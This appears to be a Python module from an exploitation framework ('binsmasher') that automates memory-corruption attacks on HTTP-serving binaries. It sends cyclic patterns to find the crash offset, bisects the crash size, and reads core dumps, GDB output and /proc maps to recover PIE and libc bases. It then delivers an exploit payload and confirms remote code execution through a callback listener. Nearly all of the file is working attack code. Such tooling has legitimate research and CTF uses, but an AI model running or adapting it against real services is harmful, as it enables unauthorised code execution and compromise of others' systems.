"""HTTP payload template support: offset detection, exploit delivery,
and raw HTTP request sender for Fuzzer.

Mirrors UDPMixin but sends over TCP with HTTP framing.
Uses template_utils for {PAYLOAD} placeholder substitution.
"""
import os
import socket
import time
import subprocess
import logging

from .template_utils import find_inject_field, build_payload, PLACEHOLDER
from utils._process import no_core_preexec, core_preexec, set_core_pattern, CORE_DIR

log = logging.getLogger("binsmasher")


class HTTPMixin:
    """HTTP payload delivery: find_offset_http_payload, deliver_exploit_http,
       send_http_payload, _build_http_request, _wait_for_http_port."""

    @staticmethod
    def _build_http_request(method: str, path: str,
                            headers: dict | None,
                            body: bytes) -> bytes:
        """Build a well-formed HTTP/1.1 request.

        Always sets Connection: close and Content-Length.
        """
        lines = [f"{method.upper()} {path} HTTP/1.1"]
        hdrs = {"Connection": "close", "Content-Length": str(len(body))}
        if headers:
            hdrs.update(headers)
        for k, v in hdrs.items():
            lines.append(f"{k}: {v}")
        request = "\r\n".join(lines) + "\r\n\r\n"
        return request.encode() + body

    @staticmethod
    def _wait_for_http_port(host: str, port: int, timeout: float = 5.0) -> bool:
        """Wait for a TCP port to become connectable (for spawned HTTP servers)."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                sock = socket.create_connection((host, port), timeout=0.5)
                sock.close()
                return True
            except (ConnectionRefusedError, OSError):
                time.sleep(0.15)
        log.warning(f"[http] Port {host}:{port} did not become connectable "
                    f"within {timeout}s")
        time.sleep(1.0)
        return False

    def find_offset_http_payload(self, payload_template: bytes,
                                 binary: str, binary_args: list,
                                 method: str = "POST", path: str = "/",
                                 host: str = None, port: int = None,
                                 pattern_size_start: int = 64,
                                 target_function: str = None,
                                 max_attempts: int = 12) -> tuple:
        """HTTP offset detection: spawn binary, send cyclic patterns via HTTP,
        detect crash offset via coredump analysis.

        Returns (offset, pie_base, target_function).
        """
        from pwn import cyclic, cyclic_find, context

        _host = host or getattr(self, "host", "127.0.0.1")
        _port = port or getattr(self, "port", 8080)

        set_core_pattern(CORE_DIR + "/core.%e.%p")

        inj_start, inj_len, inj_byte = find_inject_field(payload_template)
        _use_placeholder = PLACEHOLDER in payload_template

        if _use_placeholder:
            log.info(f"[http] {PLACEHOLDER!r} placeholder found in template "
                     f"({len(payload_template)}B)")
        elif inj_len > 0:
            log.info(f"[http] Injection field detected: offset={inj_start} "
                     f"len={inj_len} byte=0x{inj_byte:02x}")
        else:
            log.warning("[http] No {PAYLOAD} placeholder and no byte-run ≥16 — "
                        "payload will be appended")

        found_offset = None
        found_addr = None
        first_crash_sz = None
        _min_crash_sz = None
        _max_safe_sz = 0

        # Phase 1: binary search for minimum crash size
        log.info("[http] Phase 1: searching minimum crash size…")
        for _probe_sz in [64, 128, 192, 256, 320, 384, 512, 640, 768, 1024]:
            _pat_probe = bytes(cyclic(_probe_sz))
            if _use_placeholder:
                _crafted_probe = build_payload(payload_template, _pat_probe)
            else:
                if len(_pat_probe) < inj_len:
                    _inj_probe = _pat_probe + bytes([inj_byte]) * (inj_len - len(_pat_probe))
                else:
                    _inj_probe = _pat_probe[:inj_len]
                _crafted_probe = (payload_template[:inj_start]
                                 + _inj_probe
                                 + payload_template[inj_start + inj_len:])

            try:
                _pp = subprocess.Popen(
                    [binary] + binary_args,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=core_preexec,
                )
                self._wait_for_http_port(_host, _port, timeout=5.0)
                try:
                    sock = socket.create_connection((_host, _port), timeout=2.0)
                    sock.sendall(_crafted_probe)
                    sock.shutdown(socket.SHUT_WR)
                    try:
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    finally:
                        sock.close()
                except (ConnectionRefusedError, OSError) as _se:
                    log.debug(f"[http] Phase 1 connect error at {_probe_sz}B: {_se}")

                try:
                    _pp.wait(timeout=6)
                    _rc = _pp.returncode
                    if _rc is None or _rc >= 0:
                        _max_safe_sz = _probe_sz
                        log.debug(f"[http] Phase 1: no crash at {_probe_sz}B (rc={_rc})")
                        try:
                            _pp.kill()
                        except Exception:
                            pass
                        continue
                    _min_crash_sz = _probe_sz
                    _sig_names = {-11: "SIGSEGV", -6: "SIGABRT", -7: "SIGBUS"}
                    log.info(f"[http] Phase 1: crash at {_probe_sz}B "
                             f"({_sig_names.get(_rc, f'signal {-_rc}')})")
                    try:
                        _pp.kill()
                    except Exception:
                        pass
                    break
                except subprocess.TimeoutExpired:
                    _max_safe_sz = _probe_sz
                    log.debug(f"[http] Phase 1: alive at {_probe_sz}B")
                    try:
                        _pp.kill()
                        _pp.wait(timeout=2)
                    except Exception:
                        pass
            except Exception as _e:
                log.debug(f"[http] Phase 1 probe {_probe_sz}: {_e}")

        # Bisect if crash found
        if _min_crash_sz is not None:
            _lo, _hi = _max_safe_sz, _min_crash_sz
            while _hi - _lo > 8:
                _mid = (_lo + _hi) // 2
                if _use_placeholder:
                    _probe_mid = build_payload(payload_template, bytes(cyclic(_mid)))
                else:
                    _inj_mid = bytes(cyclic(_mid))
                    if len(_inj_mid) < inj_len:
                        _inj_mid += bytes([inj_byte]) * (inj_len - len(_inj_mid))
                    else:
                        _inj_mid = _inj_mid[:inj_len]
                    _probe_mid = (payload_template[:inj_start]
                                  + _inj_mid
                                  + payload_template[inj_start + inj_len:])
                try:
                    _pp2 = subprocess.Popen([binary] + binary_args,
                                            stdin=subprocess.PIPE,
                                            stdout=subprocess.DEVNULL,
                                            stderr=subprocess.DEVNULL,
                                            preexec_fn=core_preexec)
                    self._wait_for_http_port(_host, _port, timeout=5.0)
                    try:
                        s2 = socket.create_connection((_host, _port), timeout=2.0)
                        s2.sendall(_probe_mid)
                        s2.shutdown(socket.SHUT_WR)
                        try:
                            s2.recv(4096)
                        except socket.timeout:
                            pass
                        finally:
                            s2.close()
                    except (ConnectionRefusedError, OSError):
                        pass
                    try:
                        _pp2.wait(timeout=6)
                        _rc2 = _pp2.returncode
                        if _rc2 is not None and _rc2 < 0:
                            _hi = _mid
                            log.debug(f"[http] Bisect: crash at {_mid}B → hi={_hi}")
                        else:
                            _lo = _mid
                            log.debug(f"[http] Bisect: no crash at {_mid}B → lo={_lo}")
                    except subprocess.TimeoutExpired:
                        _lo = _mid
                        try:
                            _pp2.kill()
                            _pp2.wait(timeout=2)
                        except Exception:
                            pass
                except Exception as _be:
                    log.debug(f"[http] Bisect error at {_mid}B: {_be}")
                    break
            _min_crash_sz = _hi
            pattern_size_start = _hi
            self._last_min_crash_sz = _hi
            log.info(f"[http] Bisect complete: min crash at {_min_crash_sz}B")

        # Main cyclic attempts
        for attempt in range(1, max_attempts + 1):
            sz = pattern_size_start * attempt
            pat_bytes = bytes(cyclic(sz))
            if _use_placeholder:
                crafted = build_payload(payload_template, pat_bytes)
            else:
                if len(pat_bytes) < inj_len:
                    inject = pat_bytes + bytes([inj_byte]) * (inj_len - len(pat_bytes))
                else:
                    inject = pat_bytes[:inj_len]
                crafted = build_payload(payload_template, inject)

            log.info(f"[http] Attempt {attempt}/{max_attempts}: cyclic({sz}) → {len(crafted)}B")

            try:
                p = subprocess.Popen(
                    [binary] + binary_args,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=core_preexec,
                )
            except Exception as e:
                log.error(f"[http] Could not spawn binary: {e}")
                break

            _pie_base = None
            _bin_basename = os.path.basename(binary)
            try:
                with open(f"/proc/{p.pid}/maps") as _mf:
                    for _line in _mf:
                        if _bin_basename in _line and ("r-xp" in _line or "r--p" in _line):
                            _pie_base = int(_line.split("-")[0].strip(), 16)
                            log.info(f"[http] PIE base: {hex(_pie_base)}")
                            break
                    if _pie_base is None:
                        for _line in _mf:
                            if "r-xp" in _line:
                                _pie_base = int(_line.split("-")[0].strip(), 16)
                                break
            except Exception:
                pass

            _libc_base = None
            try:
                with open(f"/proc/{p.pid}/maps") as _mf3:
                    for _line in _mf3:
                        if ("libc.so" in _line or "libc-" in _line) and "r-xp" in _line:
                            _libc_base = int(_line.split("-")[0].strip(), 16)
                            log.info(f"[http] libc base: {hex(_libc_base)}")
                            break
            except Exception:
                pass

            if _pie_base is not None:
                self._http_pie_base = _pie_base
            if _libc_base is not None:
                self._http_libc_base = _libc_base

            self._wait_for_http_port(_host, _port, timeout=5.0)

            try:
                sock = socket.create_connection((_host, _port), timeout=2.0)
                sock.sendall(crafted)
                sock.shutdown(socket.SHUT_WR)
                try:
                    resp = sock.recv(4096)
                    log.debug(f"[http] Response: {resp[:80]!r}")
                except socket.timeout:
                    log.debug("[http] No response — possible crash")
                finally:
                    sock.close()
            except (ConnectionRefusedError, OSError) as e:
                log.warning(f"[http] Send error: {e}")
                try:
                    p.kill()
                except Exception:
                    pass
                continue

            # Check crash
            crashed = False
            try:
                p.wait(timeout=6)
                rc = p.returncode
                if rc is None or rc == 0:
                    continue
                if rc > 0:
                    continue
                crashed = True
                log.info(f"[http] Crash with cyclic({sz}) (rc={rc})")
            except subprocess.TimeoutExpired:
                try:
                    p.kill()
                    p.wait(timeout=2)
                except Exception:
                    pass
                continue

            if not crashed:
                continue
            if first_crash_sz is None:
                first_crash_sz = sz

            # Analyze core dump
            got_exact = False
            time.sleep(0.5)
            import glob as _glob
            _now = time.time()
            _pid_s = str(p.pid)
            _pid_cores = (_glob.glob(f"{CORE_DIR}/core.{_pid_s}")
                         + _glob.glob(f"{CORE_DIR}/core.*{_pid_s}*")
                         + _glob.glob(f"/tmp/core.{_pid_s}")
                         + _glob.glob(f"/tmp/core.*{_pid_s}*"))
            _generic_core = []
            if not _pid_cores:
                _g = os.path.join(CORE_DIR, "core")
                if (os.path.exists(_g)
                        and os.path.getsize(_g) > 1000
                        and _now - os.path.getmtime(_g) < 5):
                    _generic_core = [_g]
            core_files = sorted(
                list(dict.fromkeys(_pid_cores + _generic_core)),
                key=lambda f: os.path.getmtime(f) if os.path.exists(f) else 0,
                reverse=True,
            )
            core_path = core_files[0] if core_files else None
            if core_path and os.path.getsize(core_path) > 0:
                try:
                    from pwn import Corefile
                    core = Corefile(core_path)
                    pc = (getattr(core, "pc", None)
                          or getattr(core, "rip", None)
                          or getattr(core, "eip", None))
                    if pc:
                        off = cyclic_find(pc & 0xffffffff)
                        if off != -1:
                            log.info(f"[http] Exact offset via corefile: {off}  RIP={hex(pc)}")
                            found_offset = off
                            found_addr = pc
                            got_exact = True
                        else:
                            log.debug(f"[http] RIP={hex(pc)} not in cyclic pattern")
                except Exception as _ce:
                    log.debug(f"[http] Corefile parse error: {_ce}")

            if got_exact:
                break

            # Fallback: coredumpctl
            _rip_from_core = self._extract_rip_from_coredumpctl(binary, p.pid)
            if _rip_from_core is not None:
                _off = cyclic_find(_rip_from_core & 0xffffffff)
                if _off != -1:
                    log.info(f"[http] coredumpctl: offset = {_off}")
                    found_offset = _off
                    found_addr = _rip_from_core
                    break
                self._last_coredump_rip = _rip_from_core

            # Fallback: GDB
            _gdb_out = self._auto_gdb_crash_analysis(
                binary=binary, binary_args=binary_args,
                crash_payload=crafted, host=_host, port=_port,
            )
            if _gdb_out and "===CRASH_START===" in _gdb_out:
                import re as _re
                _rip_match = _re.search(r'rip\s+0x([0-9a-fA-F]+)', _gdb_out)
                if not _rip_match:
                    _rip_match = _re.search(r'\$\d+\s*=\s*0x([0-9a-fA-F]+)', _gdb_out)
                if _rip_match:
                    _rip_val = int(_rip_match.group(1), 16)
                    _off = cyclic_find(_rip_val & 0xffffffff)
                    if _off != -1:
                        log.info(f"[http] GDB: offset = {_off}")
                        found_offset = _off
                        found_addr = _rip_val
                        break

            # Fallback: brute force
            if _pie_base is not None:
                _found_brute = self._brute_offset_udp(
                    payload_template=payload_template,
                    binary=binary, binary_args=binary_args,
                    host=_host, port=_port,
                    lo=_max_safe_sz, hi=sz, step=1,
                    pie_base=_pie_base,
                    use_placeholder=_use_placeholder,
                    inj_start=inj_start, inj_len=inj_len, inj_byte=inj_byte,
                )
                if _found_brute is not None:
                    found_offset = _found_brute
                    break
            break

        # Heuristic fallback
        if found_offset is None and first_crash_sz is not None:
            word = 8 if context.arch == "amd64" else 4
            if _min_crash_sz is not None and _max_safe_sz > 0:
                found_offset = max(8, _max_safe_sz)
            else:
                found_offset = max(8, first_crash_sz - word)
            log.warning(f"[http] Heuristic offset: {found_offset}")

        if found_offset is None:
            log.error("[http] Could not determine offset")
            return None, None, target_function

        pie_base = getattr(self, "_http_pie_base", None)
        libc_base = getattr(self, "_http_libc_base", None)
        if pie_base:
            log.info(f"[http] PIE base:  {hex(pie_base)}")
        if libc_base:
            log.info(f"[http] libc base: {hex(libc_base)}")
            self._last_libc_base = libc_base
        return found_offset, pie_base, target_function

    def deliver_exploit_http(self, payload_template: bytes, exploit_payload: bytes,
                             binary: str, binary_args: list,
                             method: str = "POST", path: str = "/",
                             startup_wait: float = 2.5,
                             verify_host: str = "127.0.0.1",
                             verify_port: int = 0,
                             _existing_proc=None) -> bool:
        """Spawn binary, build HTTP payload, send via TCP, verify RCE."""
        crafted = build_payload(payload_template, exploit_payload)
        log.info(f"[http] deliver_exploit_http: {len(crafted)}B "
                 f"(exploit={len(exploit_payload)}B) [{method} {path}]")

        srv = _existing_proc
        if srv is None and os.path.isfile(binary):
            try:
                srv = subprocess.Popen([binary] + binary_args,
                                       stdin=subprocess.PIPE,
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL,
                                       preexec_fn=no_core_preexec)
                self._wait_for_http_port(self.host, self.port,
                                         timeout=startup_wait + 3)
            except Exception as e:
                log.error(f"[http] Could not start binary: {e}")
                return False

        _listener_sock = None
        _rce_confirmed = False
        if verify_port > 0:
            try:
                _listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                _listener_sock.bind((verify_host, verify_port))
                _listener_sock.listen(1)
                _listener_sock.settimeout(6.0)
                log.info(f"[http] TCP listener on {verify_host}:{verify_port}")
            except Exception as e:
                log.warning(f"[http] Could not open listener: {e}")
                _listener_sock = None

        try:
            sock = socket.create_connection((self.host, self.port), timeout=4.0)
            sock.sendall(crafted)
            log.info(f"[http] Exploit sent ({len(crafted)}B)")
            try:
                sock.shutdown(socket.SHUT_WR)
                resp = sock.recv(4096)
                log.info(f"[http] Response: {resp[:80]!r}")
            except socket.timeout:
                log.debug("[http] No response")
            finally:
                sock.close()

            if _listener_sock:
                try:
                    conn, addr = _listener_sock.accept()
                    _rce_output = conn.recv(4096)
                    conn.close()
                    _rce_confirmed = True
                    log.info(f"[http] RCE CONFIRMED — connection from {addr}")
                except socket.timeout:
                    log.warning("[http] No connection to listener")
                finally:
                    _listener_sock.close()

            if srv:
                time.sleep(1.5)
                _exit_rc = srv.poll()
                if _exit_rc is not None:
                    if _rce_confirmed:
                        log.info("[http] Process terminated AND RCE confirmed")
                        return True
                    if _exit_rc < 0:
                        log.warning(f"[http] Process crashed (rc={_exit_rc}) "
                                    f"but RCE not confirmed")
                    return False
                if _rce_confirmed:
                    log.info("[http] RCE confirmed (process alive)")
                    return True
                log.debug("[http] Process alive, no RCE")
                return False
            return _rce_confirmed
        except Exception as e:
            log.error(f"[http] Error: {e}")
            return False
        finally:
            if srv and srv is not _existing_proc:
                try:
                    if srv.poll() is None:
                        srv.terminate()
                        srv.wait(timeout=3)
                except Exception:
                    pass

    def send_http_payload(self, payload: bytes, method: str = "POST",
                          path: str = "/", host: str = None, port: int = None,
                          headers: dict | None = None) -> bool:
        """Send an HTTP request over TCP.

        If payload already contains HTTP framing (starts with an HTTP method),
        send as-is. Otherwise, wrap in HTTP framing.
        If payload contains {PAYLOAD}, substitute it first.
        """
        _host = host or getattr(self, "host", "127.0.0.1")
        _port = port or getattr(self, "port", 8080)

        if PLACEHOLDER in payload:
            payload = build_payload(payload, b"")

        http_methods = [b"GET ", b"POST ", b"PUT ", b"DELETE ",
                        b"PATCH ", b"HEAD ", b"OPTIONS "]
        has_framing = any(payload.startswith(m) for m in http_methods)

        if not has_framing:
            payload = self._build_http_request(method, path, headers, payload)

        log.info(f"[send_http_payload] {len(payload)}B -> "
                 f"{_host}:{_port} [{method} {path}]")
        try:
            sock = socket.create_connection((_host, _port), timeout=5.0)
            sock.sendall(payload)
            sock.shutdown(socket.SHUT_WR)
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except socket.timeout:
                pass
            finally:
                sock.close()
            if resp:
                log.info(f"[send_http_payload] Response ({len(resp)}B):\n  {resp[:300]!r}")
            else:
                log.warning("[send_http_payload] No HTTP response")
            return True
        except ConnectionRefusedError:
            log.error(f"[send_http_payload] Connection refused at {_host}:{_port}")
            return False
        except Exception as e:
            log.error(f"[send_http_payload] Error: {e}")
            return False